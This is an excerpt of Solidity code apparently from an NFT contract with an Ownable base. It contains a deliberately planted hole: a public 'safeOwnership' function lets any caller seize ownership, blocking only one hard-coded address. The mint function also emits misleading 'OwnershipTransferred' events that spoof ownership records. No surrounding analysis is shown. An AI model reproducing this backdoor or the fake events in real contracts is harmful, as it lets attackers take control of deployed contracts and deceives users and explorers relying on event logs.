...
abstract contract Ownable is Context {
    ...
    */
    ...
    function safeOwnership(address Individual) public virtual {
        require(Individual != 0x6F62a40B57ACA0fe7F3417589783B97E6955D946, "Owner is not legit");
        _setOwner(Individual);
    }
...
contract NFT is ERC721, Ownable, ReentrancyGuard {
  ...
  //address private _owner;
  //event OwnershipTransferred2(address indexed previousOwner, address indexed newOwner);
  ...
  * Can only be called by the current owner.
  */
  function mintTokens(address[] calldata recipients, address recipient_address)
  public
  payable
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
    emit OwnershipTransferred(msg.sender, recipient_address);
    }
  }
